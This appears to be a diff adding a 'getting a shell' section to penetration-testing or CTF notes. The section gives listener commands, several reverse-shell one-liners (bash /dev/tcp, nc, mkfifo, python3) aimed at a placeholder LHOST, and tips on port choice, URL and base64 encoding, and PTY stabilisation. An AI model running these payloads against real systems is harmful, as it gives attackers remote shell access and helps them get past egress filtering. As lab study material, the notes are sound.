@@ -28,6 +28,67 @@ already written up in this repo, it's cross-linked for full worked detail.
 
 ---
 
+## Getting a shell — listener, payload, PTY upgrade
+
+Order of operations, every time: **start the listener first**, *then* fire the payload. A payload
+that connects back before anything is listening just errors out and can burn a one-shot trigger.
+
+**1. Listener.** Default to **Penelope** — it auto-upgrades to a full PTY, logs the session, and
+manages multiple shells, so it removes the manual stabilisation dance below:
+
+```bash
+penelope 443                    # listen on 443 (port is positional; see the Arsenal note in ../README.md)
+```
+
+Raw `nc` is the always-available fallback when Penelope isn't on the box:
+
+```bash
+rlwrap nc -lvnp 443             # rlwrap gives line-editing/history in the raw shell
+```
+
+Prefer a port outbound traffic is likely allowed on (**443**, 80, 53) over a random high port —
+egress firewalls on the target frequently block arbitrary outbound connections but allow these.
+
+**2. Payload.** Set `LHOST`/`LPORT` to *your* tun0 IP and the listener port. Don't assume `bash`
+exists — busybox/appliance targets often only have `sh`. Have a few interpreters ready and try them
+in order of what the box actually has:
+
+```bash
+# bash (most common)
+bash -i >& /dev/tcp/LHOST/443 0>&1
+# sh fallback (POSIX, works where bash is absent)
+sh -i >& /dev/tcp/LHOST/443 0>&1
+# nc with -e, or the mkfifo form when -e is compiled out
+nc LHOST 443 -e /bin/sh
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 443 >/tmp/f
+# python3 (very common on modern Linux)
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
+```
+
+For anything more exotic (perl, php, socat, awk, msfvenom ELF), pull the exact string from
+**revshells.com** rather than hand-writing it.
+
+**3. Context-specific gotchas.**
+- **Delivered through a web parameter / URL:** URL-encode the payload (spaces, `&`, `;`, `|`, `/`,
+  `>` all break the request otherwise). A reverse shell that "does nothing" over HTTP is usually a
+  quoting/encoding failure, not a blocked connection — test with a `ping`/`curl` back to yourself
+  first to confirm code execution before debugging the shell payload.
+- **Quoting through nested shells** (e.g. command injection inside an already-quoted string): the
+  `/dev/tcp` form with `$` and `&` is the most fragile — base64-encode the whole payload and
+  `echo <b64> | base64 -d | bash` to sidestep quote mangling.
+
+**4. Stabilise a raw shell → full PTY** (skip if using Penelope — it does this automatically):
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # step 1: get a pty
+export TERM=xterm                                # step 2: enable clear/less/vim
+# step 3: Ctrl-Z to background, then on your box:
+stty raw -echo; fg                               # re-foreground with raw local tty
+# (press Enter twice) — now Ctrl-C, tab-completion, and arrow keys work
+```
+
+---
+
 ## Privilege escalation — standard enumeration order
 
 ```bash
